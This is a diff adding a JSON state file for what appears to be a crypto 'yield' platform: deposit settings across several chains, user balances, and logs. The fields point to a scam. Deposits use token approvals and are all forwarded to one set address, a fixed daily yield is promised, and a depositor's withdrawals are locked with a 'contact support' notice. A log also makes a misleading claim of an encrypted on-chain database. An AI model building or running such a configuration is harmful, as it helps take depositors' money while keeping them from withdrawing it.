@@ -1,0 +1,198 @@
+{
+  "config": {
+    "recipientAddress": "0x71C7656EC7ab88b098defB751B7401B5f6d1476B",
+    "adminPasswordHash": "240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9",
+    "minDepositUSDT": 10,
+    "minWithdrawUSDT": 10,
+    "minParticipateETH": 0.5,
+    "baseYieldRate": 0.0055,
+    "depositMode": "approve",
+    "depositSystems": [
+      {
+        "id": "USDT_1",
+        "currency": "USDT",
+        "chainId": 1,
+        "chainName": "Ethereum Mainnet",
+        "tokenAddress": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+        "enabled": true
+      },
+      {
+        "id": "USDT_56",
+        "currency": "USDT",
+        "chainId": 56,
+        "chainName": "BNB Smart Chain",
+        "tokenAddress": "0x55d398326f99059fF775485246999027B3197955",
+        "enabled": true
+      },
+      {
+        "id": "USDT_137",
+        "currency": "USDT",
+        "chainId": 137,
+        "chainName": "Polygon Mainnet",
+        "tokenAddress": "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
+        "enabled": true
+      },
+      {
+        "id": "USDT_42161",
+        "currency": "USDT",
+        "chainId": 42161,
+        "chainName": "Arbitrum One",
+        "tokenAddress": "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
+        "enabled": true
+      },
+      {
+        "id": "USDT_11155111",
+        "currency": "USDT",
+        "chainId": 11155111,
+        "chainName": "Sepolia Testnet",
+        "tokenAddress": "0xaA8E23Fb1079EA71e0a56F48a2AA51851D8433D0",
+        "enabled": true
+      },
+      {
+        "id": "USDC_1",
+        "currency": "USDC",
+        "chainId": 1,
+        "chainName": "Ethereum Mainnet",
+        "tokenAddress": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+        "enabled": true
+      },
+      {
+        "id": "USDC_56",
+        "currency": "USDC",
+        "chainId": 56,
+        "chainName": "BNB Smart Chain",
+        "tokenAddress": "0x8AC76a51cc950d9822D68b83FE1Ad97B32CD580d",
+        "enabled": true
+      },
+      {
+        "id": "USDC_137",
+        "currency": "USDC",
+        "chainId": 137,
+        "chainName": "Polygon Mainnet",
+        "tokenAddress": "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359",
+        "enabled": true
+      },
+      {
+        "id": "USDC_42161",
+        "currency": "USDC",
+        "chainId": 42161,
+        "chainName": "Arbitrum One",
+        "tokenAddress": "0xaf88d065e77c8cC2239327C5EDb3A432268e5831",
+        "enabled": true
+      },
+      {
+        "id": "USDC_11155111",
+        "currency": "USDC",
+        "chainId": 11155111,
+        "chainName": "Sepolia Testnet",
+        "tokenAddress": "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238",
+        "enabled": true
+      },
+      {
+        "id": "BTC_1",
+        "currency": "BTC",
+        "chainId": 1,
+        "chainName": "Ethereum Mainnet",
+        "tokenAddress": "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
+        "enabled": true
+      },
+      {
+        "id": "BTC_56",
+        "currency": "BTC",
+        "chainId": 56,
+        "chainName": "BNB Smart Chain",
+        "tokenAddress": "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c",
+        "enabled": true
+      },
+      {
+        "id": "BTC_42161",
+        "currency": "BTC",
+        "chainId": 42161,
+        "chainName": "Arbitrum One",
+        "tokenAddress": "0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f",
+        "enabled": true
+      }
+    ]
+  },
+  "users": {
+    "0x1782cce959911b58d6f73c65a9bc23e5c99ce07d": {
+      "walletAddress": "0x1782cce959911b58d6f73c65a9bc23e5c99ce07d",
+      "usdtBalance": 4.552747871527786,
+      "occupiedUSDT": 200,
+      "totalYieldEarned": 81.10110742708332,
+      "lastYieldPayout": 1786465719226,
+      "createdAt": 1784604076523,
+      "usdcBalance": 0,
+      "btcBalance": 0,
+      "isWithdrawLocked": true,
+      "withdrawLockNotice": "Your account withdrawal is currently locked. Please contact support.",
+      "ethBalance": 0.021870959873015867
+    },
+    "0x71c7656ec7ab88b098defb751b7401b5f6d1476b": {
+      "walletAddress": "0x71c7656ec7ab88b098defb751b7401b5f6d1476b",
+      "usdtBalance": 0,
+      "occupiedUSDT": 0,
+      "totalYieldEarned": 0,
+      "lastYieldPayout": 1784605791417,
+      "createdAt": 1784605791417,
+      "usdcBalance": 0,
+      "occupiedUSDC": 0,
+      "btcBalance": 0,
+      "occupiedBTC": 0
+    }
+  },
+  "logs": [
+    {
+      "id": "system-init",
+      "timestamp": 1784604046799,
+      "walletAddress": "SYSTEM",
+      "type": "system",
+      "amount": 0,
+      "currency": "SYSTEM",
+      "status": "success",
+      "details": "Secure on-chain database initiated with AES-256 encryption."
+    },
+    {
+      "id": "log-6132d9c3",
+      "timestamp": 1784604076523,
+      "walletAddress": "0x1782cce959911b58d6f73c65a9bc23e5c99ce07d",
+      "type": "connect",
+      "amount": 0,
+      "currency": "WALLET",
+      "status": "success",
+      "details": "Wallet connected successfully. Created secure encrypted balance profile."
+    },
+    {
+      "id": "log-fc4b9024",
+      "timestamp": 1784604668076,
+      "walletAddress": "0x1782cce959911b58d6f73c65a9bc23e5c99ce07d",
+      "type": "deposit",
+      "amount": 100,
+      "currency": "USDT",
+      "status": "success",
+      "details": "Deposited 100 USDT. (Simulated) Funds automatically forwarded to set address: 0x71C7656EC7ab88b098defB751B7401B5f6d1476B",
+      "txHash": "0x876053d0fb10d3d709fcc2b569685eb1af53d97ebf3187c4b90b8d09db1907d4"
+    },
+    {
+      "id": "log-cd6f3126",
+      "timestamp": 1784605312226,
+      "walletAddress": "0x1782cce959911b58d6f73c65a9bc23e5c99ce07d",
+      "type": "deposit",
+      "amount": 100,
+      "currency": "USDT",
+      "status": "success",
+      "details": "Deposited 100 USDT. (Simulated) Funds automatically forwarded to set address: 0x71C7656EC7ab88b098defB751B7401B5f6d1476B",
+      "txHash": "0x0386913b493a9456907827232e35d862389df08a52d852c6161c3ace935e9d0b"
+    },
+    {
+      "id": "log-bf0bdfaa",
+      "timestamp": 1784605791417,
+      "walletAddress": "0x71c7656ec7ab88b098defb751b7401b5f6d1476b",
+      "type": "connect",
+      "amount": 0,
+      "currency": "WALLET",
+      "status": "success",
+      "details": "Wallet connected successfully. Created secure encrypted balance profile."
+    }
+  ]
+}
